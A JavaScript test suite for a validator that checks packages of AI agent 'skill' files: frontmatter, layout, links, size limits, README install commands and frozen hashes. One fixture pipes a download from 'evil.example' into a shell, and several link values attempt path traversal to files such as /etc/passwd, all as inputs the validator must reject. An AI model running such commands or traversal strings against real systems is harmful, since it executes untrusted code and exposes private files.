import { afterEach, describe, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  renameSync,
  rmSync,
  symlinkSync,
  unlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";

import { validateRepository } from "./validate.mjs";

const roots = [];
const defaultConfig = { forbiddenTerms: [], frozenSkills: {} };

afterEach(() => {
  for (const root of roots.splice(0)) {
    rmSync(root, { force: true, recursive: true });
  }
});

function fixture() {
  const root = mkdtempSync(join(tmpdir(), "skill-validator-"));
  roots.push(root);
  return root;
}

function write(root, relativePath, content) {
  const path = join(root, relativePath);
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, content);
}

function remove(root, relativePath) {
  unlinkSync(join(root, relativePath));
}

function skillDocument(name, body = "Use the supplied material.\n") {
  return [
    "---",
    `name: ${name}`,
    "description: Perform the requested work.",
    "---",
    "",
    `# ${name}`,
    "",
    body.trimEnd(),
    "",
  ].join("\n");
}

function exactLengthSkill(name, lineCount) {
  const lines = [
    "---",
    `name: ${name}`,
    "description: Perform the requested work.",
    "---",
    `# ${name}`,
  ];

  while (lines.length < lineCount) {
    lines.push(`Line ${lines.length + 1}.`);
  }

  return `${lines.join("\n")}\n`;
}

function exactLengthReference(lineCount, withContents = false) {
  const lines = ["# Reference"];

  if (withContents) {
    lines.push("", "## Contents", "", "- [Reference](#reference)");
  }

  while (lines.length < lineCount) {
    lines.push(`Line ${lines.length + 1}.`);
  }

  return `${lines.join("\n")}\n`;
}

function readme(...folders) {
  return [
    "# Skills",
    "",
    ...folders.flatMap((folder) => [
      "```sh",
      `npx skills@latest add KrishRVH/skills/${folder}`,
      "```",
      "",
    ]),
  ].join("\n");
}

function validate(root, config = defaultConfig) {
  return validateRepository(root, { config });
}

function codes(errors) {
  return errors.map(({ code }) => code);
}

function sha256(content) {
  return createHash("sha256").update(content).digest("hex");
}

describe("valid repositories", () => {
  test("accepts a linked support graph and a matching README entry", () => {
    const root = fixture();
    write(
      root,
      "sample-skill/SKILL.md",
      skillDocument(
        "sample-skill",
        "Read the [guide](references/guide.md).",
      ),
    );
    write(
      root,
      "sample-skill/references/guide.md",
      "# Guide\n\nRead the [detail](detail.md).\n",
    );
    write(root, "sample-skill/references/detail.md", "# Detail\n");
    write(root, "README.md", readme("sample-skill"));

    expect(validate(root)).toEqual([]);
  });

  test("uses Git discovery for untracked files and skips ignored dependencies", () => {
    const root = fixture();
    const init = Bun.spawnSync(["git", "init", "--quiet"], {
      cwd: root,
      stderr: "pipe",
      stdout: "pipe",
    });
    expect(init.exitCode).toBe(0);
    write(root, ".gitignore", "node_modules/\n");
    write(root, "node_modules/package/index.js", "export {};\n");
    write(root, "sample-skill/SKILL.md", skillDocument("sample-skill"));
    write(root, "README.md", readme("sample-skill"));

    expect(validate(root)).toEqual([]);

    const linkedRoot = `${root}-link`;
    symlinkSync(root, linkedRoot, "dir");
    roots.push(linkedRoot);
    expect(validate(linkedRoot)).toEqual([]);

    write(root, "scripts/tool.mjs", "export {};\n");
    expect(codes(validate(root))).toContain("repository.skill-entry");
  });
});

describe("frontmatter", () => {
  const cases = [
    [
      "rejects malformed YAML",
      "---\nname: sample-skill\ndescription: [broken\n---\n# Skill\n",
      "frontmatter.format",
    ],
    [
      "rejects duplicate top-level keys",
      "---\nname: sample-skill\nname: duplicate\ndescription: Work.\n---\n# Skill\n",
      "frontmatter.duplicate",
    ],
    [
      "rejects duplicate keys written with different YAML syntax",
      '---\n"na\\u006de": sample-skill\nname: duplicate\ndescription: Work.\n---\n# Skill\n',
      "frontmatter.duplicate",
    ],
    [
      "rejects root-indented YAML mappings",
      "---\n  name: sample-skill\n  name: duplicate\n  description: Work.\n---\n# Skill\n",
      "frontmatter.duplicate",
    ],
    [
      "rejects flow-mapping frontmatter",
      "---\n{name: sample-skill, name: duplicate, description: Work.}\n---\n# Skill\n",
      "frontmatter.duplicate",
    ],
    [
      "rejects unknown keys",
      "---\nname: sample-skill\ndescription: Work.\nauthor: Someone\n---\n# Skill\n",
      "frontmatter.key",
    ],
    [
      "requires a nonempty description",
      "---\nname: sample-skill\ndescription: ''\n---\n# Skill\n",
      "frontmatter.description",
    ],
    [
      "requires a boolean invocation flag",
      "---\nname: sample-skill\ndescription: Work.\ndisable-model-invocation: 'true'\n---\n# Skill\n",
      "frontmatter.invocation",
    ],
    [
      "requires a portable kebab-case name",
      "---\nname: Sample_Skill\ndescription: Work.\n---\n# Skill\n",
      "frontmatter.name",
    ],
  ];

  for (const [label, document, expectedCode] of cases) {
    test(label, () => {
      const root = fixture();
      write(root, "sample-skill/SKILL.md", document);
      write(root, "README.md", readme("sample-skill"));

      expect(codes(validate(root))).toContain(expectedCode);
    });
  }

  test("enforces the documented name and description boundaries", () => {
    const validName = "a".repeat(64);
    const validRoot = fixture();
    write(
      validRoot,
      `${validName}/SKILL.md`,
      `---\nname: ${validName}\ndescription: ${"x".repeat(1024)}\n---\n# Skill\n`,
    );
    write(validRoot, "README.md", readme(validName));
    expect(codes(validate(validRoot))).not.toContain("frontmatter.name");
    expect(codes(validate(validRoot))).not.toContain(
      "frontmatter.description",
    );

    const invalidName = "a".repeat(65);
    const invalidRoot = fixture();
    write(
      invalidRoot,
      `${invalidName}/SKILL.md`,
      `---\nname: ${invalidName}\ndescription: ${"x".repeat(1025)}\n---\n# Skill\n`,
    );
    write(invalidRoot, "README.md", readme(invalidName));
    expect(codes(validate(invalidRoot))).toContain("frontmatter.name");
    expect(codes(validate(invalidRoot))).toContain(
      "frontmatter.description",
    );
  });

  test("accepts a valid multiline plain scalar", () => {
    const root = fixture();
    write(
      root,
      "sample-skill/SKILL.md",
      "---\nname: sample-skill\ndescription: This is a\n  multiline description.\n---\n# Skill\n",
    );
    write(root, "README.md", readme("sample-skill"));

    expect(validate(root)).toEqual([]);
  });
});

describe("package structure", () => {
  test("rejects visible non-skill directories", () => {
    const root = fixture();
    write(root, "scripts/tool.mjs", "export {};\n");
    write(root, "README.md", "# Skills\n");

    expect(codes(validate(root))).toContain("repository.skill-entry");
  });

  test("requires the folder and portable name to match", () => {
    const root = fixture();
    write(root, "folder-name/SKILL.md", skillDocument("different-name"));
    write(root, "README.md", readme("folder-name"));

    expect(codes(validate(root))).toContain("package.name");
  });

  test("rejects stray root files and unsupported directories", () => {
    const root = fixture();
    write(root, "sample-skill/SKILL.md", skillDocument("sample-skill"));
    write(root, "sample-skill/NOTES.md", "# Notes\n");
    write(root, "sample-skill/docs/guide.md", "# Guide\n");
    write(root, "README.md", readme("sample-skill"));

    expect(codes(validate(root))).toContain("package.layout");
  });

  test("enforces the parent skill's uppercase template stem", () => {
    const root = fixture();
    write(
      root,
      "sample-skill/SKILL.md",
      skillDocument(
        "sample-skill",
        "Use the [template](templates/WRONG.html).",
      ),
    );
    write(root, "sample-skill/templates/WRONG.html", "<!doctype html>\n");
    write(root, "README.md", readme("sample-skill"));

    expect(codes(validate(root))).toContain("package.template-name");
  });

  test("rejects symlinks inside portable packages", () => {
    const root = fixture();
    write(
      root,
      "sample-skill/SKILL.md",
      skillDocument(
        "sample-skill",
        "Read the [guide](references/guide.md).",
      ),
    );
    write(root, "outside.md", "# Outside\n");
    mkdirSync(join(root, "sample-skill/references"), { recursive: true });
    symlinkSync(
      join(root, "outside.md"),
      join(root, "sample-skill/references/guide.md"),
    );
    write(root, "README.md", readme("sample-skill"));

    expect(codes(validate(root))).toContain("package.symlink");
  });

  test("does not follow a top-level package symlink", () => {
    const root = fixture();
    const outside = fixture();
    write(outside, "SKILL.md", "not frontmatter\n");
    symlinkSync(outside, join(root, "sample-skill"), "dir");
    write(root, "README.md", readme("sample-skill"));

    const result = validate(root);
    expect(codes(result)).toContain("package.symlink");
    expect(codes(result)).not.toContain("frontmatter.format");
  });

  test("allows a skill folder named like an object prototype property", () => {
    const root = fixture();
    write(root, "constructor/SKILL.md", skillDocument("constructor"));
    write(root, "README.md", readme("constructor"));

    expect(validate(root)).toEqual([]);
  });
});

describe("support-file reachability", () => {
  test("rejects an orphan support file", () => {
    const root = fixture();
    write(root, "sample-skill/SKILL.md", skillDocument("sample-skill"));
    write(root, "sample-skill/references/guide.md", "# Guide\n");
    write(root, "README.md", readme("sample-skill"));

    expect(codes(validate(root))).toContain("package.orphan");
  });

  test("does not treat a code-span path as a link", () => {
    const root = fixture();
    write(
      root,
      "sample-skill/SKILL.md",
      skillDocument("sample-skill", "Read `references/guide.md`."),
    );
    write(root, "sample-skill/references/guide.md", "# Guide\n");
    write(root, "README.md", readme("sample-skill"));

    expect(codes(validate(root))).toContain("package.orphan");
  });

  test("counts only used reference links and handles balanced destinations", () => {
    const unusedRoot = fixture();
    write(
      unusedRoot,
      "sample-skill/SKILL.md",
      skillDocument(
        "sample-skill",
        "[guide]: references/guide_(v2).md",
      ),
    );
    write(
      unusedRoot,
      "sample-skill/references/guide_(v2).md",
      "# Guide\n",
    );
    write(unusedRoot, "README.md", readme("sample-skill"));
    expect(codes(validate(unusedRoot))).toContain("package.orphan");

    const usedRoot = fixture();
    write(
      usedRoot,
      "sample-skill/SKILL.md",
      skillDocument(
        "sample-skill",
        "Read [the guide][guide].\n\n[guide]: references/guide_(v2).md",
      ),
    );
    write(
      usedRoot,
      "sample-skill/references/guide_(v2).md",
      "# Guide\n",
    );
    write(usedRoot, "README.md", readme("sample-skill"));
    expect(validate(usedRoot)).toEqual([]);
  });

  test("rejects links that escape the skill package", () => {
    const root = fixture();
    write(
      root,
      "sample-skill/SKILL.md",
      skillDocument("sample-skill", "Read the [root guide](../README.md)."),
    );
    write(root, "README.md", readme("sample-skill"));

    expect(codes(validate(root))).toContain("package.link-escape");
  });

  test("rejects percent-encoded cross-platform traversal", () => {
    const root = fixture();
    write(
      root,
      "sample-skill/SKILL.md",
      skillDocument(
        "sample-skill",
        "Read the [root guide](..%5cREADME.md).",
      ),
    );
    write(root, "README.md", readme("sample-skill"));

    expect(codes(validate(root))).toContain("package.link-escape");
  });

  test("rejects local absolute URI and drive-path links", () => {
    for (const destination of [
      "file:///etc/passwd",
      "C:/Windows/win.ini",
      "C:secret.txt",
      "f%69le:///etc/passwd",
      "file%3A///etc/passwd",
      "C%3A/Windows/win.ini",
      "/%5Cserver%5Cshare%5Cfile.md",
      "%5C/server/share/file.md",
    ]) {
      const root = fixture();
      write(
        root,
        "sample-skill/SKILL.md",
        skillDocument(
          "sample-skill",
          `Read the [outside file](${destination}).`,
        ),
      );
      write(root, "README.md", readme("sample-skill"));

      expect(codes(validate(root))).toContain("package.link-escape");
    }
  });

  test("allows protocol-relative external links but rejects Windows UNC paths", () => {
    const externalRoot = fixture();
    write(
      externalRoot,
      "sample-skill/SKILL.md",
      skillDocument(
        "sample-skill",
        "Read the [external guide](//cdn.example/guide.md).",
      ),
    );
    write(externalRoot, "README.md", readme("sample-skill"));
    expect(validate(externalRoot)).toEqual([]);

    const uncRoot = fixture();
    write(
      uncRoot,
      "sample-skill/SKILL.md",
      skillDocument(
        "sample-skill",
        "Read the [outside file](%5C%5Cserver%5Cshare%5Cfile.md).",
      ),
    );
    write(uncRoot, "README.md", readme("sample-skill"));
    expect(codes(validate(uncRoot))).toContain("package.link-escape");
  });
});

describe("LLM-facing boundaries", () => {
  test("accepts 500 SKILL.md lines and rejects 501", () => {
    const validRoot = fixture();
    write(
      validRoot,
      "sample-skill/SKILL.md",
      exactLengthSkill("sample-skill", 500),
    );
    write(validRoot, "README.md", readme("sample-skill"));
    expect(codes(validate(validRoot))).not.toContain("skill.length");

    const invalidRoot = fixture();
    write(
      invalidRoot,
      "sample-skill/SKILL.md",
      exactLengthSkill("sample-skill", 501),
    );
    write(invalidRoot, "README.md", readme("sample-skill"));
    expect(codes(validate(invalidRoot))).toContain("skill.length");
  });

  test("rejects a large single-line payload", () => {
    const root = fixture();
    const prefix =
      "---\nname: sample-skill\ndescription: Work.\n---\n# Skill\n";
    const targetBytes = 50_001;
    write(
      root,
      "sample-skill/SKILL.md",
      `${prefix}${"x".repeat(targetBytes - Buffer.byteLength(prefix))}`,
    );
    write(root, "README.md", readme("sample-skill"));

    expect(codes(validate(root))).toContain("skill.size");
  });

  test("counts bare carriage returns as line boundaries", () => {
    const skillRoot = fixture();
    const body = Array.from(
      { length: 501 },
      (_, index) => `Line ${index + 1}.`,
    ).join("\r");
    write(
      skillRoot,
      "sample-skill/SKILL.md",
      skillDocument("sample-skill", body),
    );
    write(skillRoot, "README.md", readme("sample-skill"));
    expect(codes(validate(skillRoot))).toContain("skill.length");

    const referenceRoot = fixture();
    write(
      referenceRoot,
      "sample-skill/SKILL.md",
      skillDocument(
        "sample-skill",
        "Read the [reference](references/guide.md).",
      ),
    );
    write(
      referenceRoot,
      "sample-skill/references/guide.md",
      Array.from(
        { length: 101 },
        (_, index) => (index === 0 ? "# Reference" : `Line ${index + 1}.`),
      ).join("\r"),
    );
    write(referenceRoot, "README.md", readme("sample-skill"));
    expect(codes(validate(referenceRoot))).toContain(
      "reference.contents",
    );
  });

  test("rejects oversized support Markdown before parsing it", () => {
    const root = fixture();
    write(
      root,
      "sample-skill/SKILL.md",
      skillDocument(
        "sample-skill",
        "Read the [reference](references/guide.md).",
      ),
    );
    write(
      root,
      "sample-skill/references/guide.md",
      "x".repeat(100_001),
    );
    write(root, "README.md", readme("sample-skill"));

    expect(codes(validate(root))).toContain("support.size");
  });

  test("requires a contents section only above 100 reference lines", () => {
    const validRoot = fixture();
    write(
      validRoot,
      "sample-skill/SKILL.md",
      skillDocument(
        "sample-skill",
        "Read the [reference](references/guide.md).",
      ),
    );
    write(
      validRoot,
      "sample-skill/references/guide.md",
      exactLengthReference(100),
    );
    write(validRoot, "README.md", readme("sample-skill"));
    expect(codes(validate(validRoot))).not.toContain("reference.contents");

    const invalidRoot = fixture();
    write(
      invalidRoot,
      "sample-skill/SKILL.md",
      skillDocument(
        "sample-skill",
        "Read the [reference](references/guide.md).",
      ),
    );
    write(
      invalidRoot,
      "sample-skill/references/guide.md",
      exactLengthReference(101),
    );
    write(invalidRoot, "README.md", readme("sample-skill"));
    expect(codes(validate(invalidRoot))).toContain("reference.contents");

    const contentsRoot = fixture();
    write(
      contentsRoot,
      "sample-skill/SKILL.md",
      skillDocument(
        "sample-skill",
        "Read the [reference](references/guide.md).",
      ),
    );
    write(
      contentsRoot,
      "sample-skill/references/guide.md",
      exactLengthReference(101, true),
    );
    write(contentsRoot, "README.md", readme("sample-skill"));
    expect(codes(validate(contentsRoot))).not.toContain("reference.contents");

    const emptyRoot = fixture();
    write(
      emptyRoot,
      "sample-skill/SKILL.md",
      skillDocument(
        "sample-skill",
        "Read the [reference](references/guide.md).",
      ),
    );
    write(
      emptyRoot,
      "sample-skill/references/guide.md",
      exactLengthReference(101).replace(
        "# Reference\n",
        "# Reference\n\n## Contents\n",
      ),
    );
    write(emptyRoot, "README.md", readme("sample-skill"));
    expect(codes(validate(emptyRoot))).toContain("reference.contents");

    const fencedRoot = fixture();
    write(
      fencedRoot,
      "sample-skill/SKILL.md",
      skillDocument(
        "sample-skill",
        "Read the [reference](references/guide.md).",
      ),
    );
    write(
      fencedRoot,
      "sample-skill/references/guide.md",
      exactLengthReference(101).replace(
        "# Reference\n",
        "# Reference\n\n```md\n## Contents\n- [Fake](#fake)\n```\n",
      ),
    );
    write(fencedRoot, "README.md", readme("sample-skill"));
    expect(codes(validate(fencedRoot))).toContain("reference.contents");
  });
});

describe("publication and policy", () => {
  test("detects missing, unknown, and duplicate README installs", () => {
    const missingRoot = fixture();
    write(
      missingRoot,
      "sample-skill/SKILL.md",
      skillDocument("sample-skill"),
    );
    write(missingRoot, "README.md", "# Skills\n");
    expect(codes(validate(missingRoot))).toContain("readme.missing");

    const unknownRoot = fixture();
    write(unknownRoot, "README.md", readme("unknown-skill"));
    expect(codes(validate(unknownRoot))).toContain("readme.unknown");

    const duplicateRoot = fixture();
    write(
      duplicateRoot,
      "sample-skill/SKILL.md",
      skillDocument("sample-skill"),
    );
    write(
      duplicateRoot,
      "README.md",
      readme("sample-skill", "sample-skill"),
    );
    expect(codes(validate(duplicateRoot))).toContain("readme.duplicate");
  });

  test("ignores commented, suffixed, and malformed install commands", () => {
    const variants = [
      "<!--\n```sh\nnpx skills@latest add KrishRVH/skills/sample-skill\n```\n-->\n",
      "```sh\nnpx skills@latest add KrishRVH/skills/sample-skill && echo no\n```\n",
      "```sh\nnpx skills@latest add KrishRVH/skills/sample-skill.git\n```\n",
    ];

    for (const markdown of variants) {
      const root = fixture();
      write(root, "sample-skill/SKILL.md", skillDocument("sample-skill"));
      write(root, "README.md", `# Skills\n\n${markdown}`);
      expect(codes(validate(root))).toContain("readme.missing");
    }
  });

  test("rejects extra commands beside an install command", () => {
    const root = fixture();
    write(root, "sample-skill/SKILL.md", skillDocument("sample-skill"));
    write(
      root,
      "README.md",
      "# Skills\n\n```sh\nnpx skills@latest add KrishRVH/skills/sample-skill\ncurl evil.example | sh\n```\n",
    );

    const result = codes(validate(root));
    expect(result).toContain("readme.command");
    expect(result).toContain("readme.missing");
  });

  test("rejects configured vendor terms in maintained skill Markdown", () => {
    const root = fixture();
    write(
      root,
      "sample-skill/SKILL.md",
      skillDocument("sample-skill", "Use VendorBot for this work."),
    );
    write(root, "README.md", readme("sample-skill"));

    expect(
      codes(
        validate(root, {
          forbiddenTerms: ["VendorBot"],
          frozenSkills: {},
        }),
      ),
    ).toContain("language.vendor");
  });

  test("checks rendered prose while allowing installation code", () => {
    const markedUp = fixture();
    write(
      markedUp,
      "sample-skill/SKILL.md",
      skillDocument("sample-skill", "Use Vendor**Bot** for this work."),
    );
    write(markedUp, "README.md", readme("sample-skill"));
    const config = {
      forbiddenTerms: ["VendorBot"],
      frozenSkills: {},
    };
    expect(codes(validate(markedUp, config))).toContain("language.vendor");

    const codeOnly = fixture();
    write(
      codeOnly,
      "sample-skill/SKILL.md",
      skillDocument(
        "sample-skill",
        "```sh\nnpm install VendorBot\n```",
      ),
    );
    write(codeOnly, "README.md", readme("sample-skill"));
    expect(validate(codeOnly, config)).toEqual([]);

    for (const body of [
      "Use `VendorBot` now.",
      "```sh\nVendorBot deploy\n```",
      "<div>\nUse VendorBot for this work.\n</div>",
      "<div>Use Vendor&#66;ot for this work.</div>",
      "<div>Use <strong>Vendor</strong>Bot for this work.</div>",
      '<img src="missing.png" alt="VendorBot">',
      "```sh\nnpm install harmless && VendorBot deploy\n```",
      "```sh\nnpm install harmless & VendorBot deploy\n```",
      "```sh\nnpx VendorBot deploy\n```",
    ]) {
      const root = fixture();
      write(
        root,
        "sample-skill/SKILL.md",
        skillDocument("sample-skill", body),
      );
      write(root, "README.md", readme("sample-skill"));
      expect(codes(validate(root, config))).toContain("language.vendor");
    }

    const pipInstall = fixture();
    write(
      pipInstall,
      "sample-skill/SKILL.md",
      skillDocument(
        "sample-skill",
        "```sh\npython -m pip install VendorBot\n```",
      ),
    );
    write(pipInstall, "README.md", readme("sample-skill"));
    expect(validate(pipInstall, config)).toEqual([]);
  });

  test("rejects unknown validator configuration keys", () => {
    const root = fixture();
    write(root, "sample-skill/SKILL.md", skillDocument("sample-skill"));
    write(root, "README.md", readme("sample-skill"));

    expect(
      codes(
        validate(root, {
          forbiddenTerms: [],
          frozenSkills: {},
          frozenSkill: {},
        }),
      ),
    ).toContain("config.format");
  });

  test("rejects duplicate keys in the JSON policy file", () => {
    const root = fixture();
    write(root, "sample-skill/SKILL.md", skillDocument("sample-skill"));
    write(root, "README.md", readme("sample-skill"));
    write(
      root,
      ".config/skills/validation.json",
      '{"forbiddenTerms":[],"forbiddenTerms":[],"frozenSkills":{}}\n',
    );

    expect(codes(validateRepository(root))).toContain("config.format");
  });
});

describe("frozen controls", () => {
  function frozenFixture() {
    const root = fixture();
    const document = skillDocument("legacy");
    write(root, "legacy-v1/SKILL.md", document);
    write(root, "README.md", readme("legacy-v1"));

    return {
      config: {
        forbiddenTerms: ["VendorBot"],
        frozenSkills: {
          "legacy-v1": {
            name: "legacy",
            files: { "SKILL.md": sha256(document) },
          },
        },
      },
      document,
      root,
    };
  }

  test("allows an explicitly frozen folder/name mismatch", () => {
    const { config, root } = frozenFixture();

    expect(validate(root, config)).toEqual([]);
  });

  test("detects frozen byte changes", () => {
    const { config, document, root } = frozenFixture();
    write(root, "legacy-v1/SKILL.md", `${document}\n`);

    expect(codes(validate(root, config))).toContain("frozen.hash");
  });

  test("detects additions and deletions in a frozen package", () => {
    const added = frozenFixture();
    write(added.root, "legacy-v1/references/extra.md", "# Extra\n");
    expect(codes(validate(added.root, added.config))).toContain("frozen.files");

    const deleted = frozenFixture();
    remove(deleted.root, "legacy-v1/SKILL.md");
    expect(codes(validate(deleted.root, deleted.config))).toContain(
      "frozen.files",
    );
  });

  test("sees dangling symlinks and POSIX backslash names through Git", () => {
    const dangling = frozenFixture();
    expect(
      Bun.spawnSync(["git", "init", "--quiet"], {
        cwd: dangling.root,
      }).exitCode,
    ).toBe(0);
    mkdirSync(join(dangling.root, "legacy-v1/references"), {
      recursive: true,
    });
    symlinkSync(
      "missing.md",
      join(dangling.root, "legacy-v1/references/dangling.md"),
    );
    const danglingCodes = codes(validate(dangling.root, dangling.config));
    expect(danglingCodes).toContain("package.symlink");
    expect(danglingCodes).toContain("frozen.files");

    if (process.platform !== "win32") {
      const backslash = frozenFixture();
      expect(
        Bun.spawnSync(["git", "init", "--quiet"], {
          cwd: backslash.root,
        }).exitCode,
      ).toBe(0);
      write(
        backslash.root,
        "legacy-v1/references\\hidden.md",
        "# Hidden\n",
      );
      expect(codes(validate(backslash.root, backslash.config))).toContain(
        "frozen.files",
      );
    }
  });

  test("fails closed on a non-UTF-8 Git path", () => {
    if (process.platform === "win32") {
      return;
    }

    const entry = frozenFixture();
    expect(
      Bun.spawnSync(["git", "init", "--quiet"], {
        cwd: entry.root,
      }).exitCode,
    ).toBe(0);
    mkdirSync(join(entry.root, "legacy-v1/references"), {
      recursive: true,
    });
    const prefix = Buffer.from(
      `${join(entry.root, "legacy-v1/references")}/`,
    );
    writeFileSync(
      Buffer.concat([prefix, Buffer.from([0xff])]),
      "invalid path\n",
    );

    expect(codes(validate(entry.root, entry.config))).toContain(
      "repository.path",
    );
  });

  test("fails closed on a non-UTF-8 path without Git", () => {
    if (process.platform === "win32") {
      return;
    }

    const entry = frozenFixture();
    mkdirSync(join(entry.root, "legacy-v1/references"), {
      recursive: true,
    });
    const prefix = Buffer.from(
      `${join(entry.root, "legacy-v1/references")}/`,
    );
    writeFileSync(
      Buffer.concat([prefix, Buffer.from([0xff])]),
      "invalid path\n",
    );

    expect(codes(validate(entry.root, entry.config))).toContain(
      "repository.path",
    );
  });
});

test("Git discovery preserves a trailing space in the repository root", () => {
  const originalRoot = fixture();
  const root = `${originalRoot} `;
  renameSync(originalRoot, root);
  roots[roots.indexOf(originalRoot)] = root;
  expect(
    Bun.spawnSync(["git", "init", "--quiet"], {
      cwd: root,
    }).exitCode,
  ).toBe(0);
  write(root, "sample-skill/SKILL.md", skillDocument("sample-skill"));
  write(root, "README.md", readme("sample-skill"));

  expect(validate(root)).toEqual([]);
});
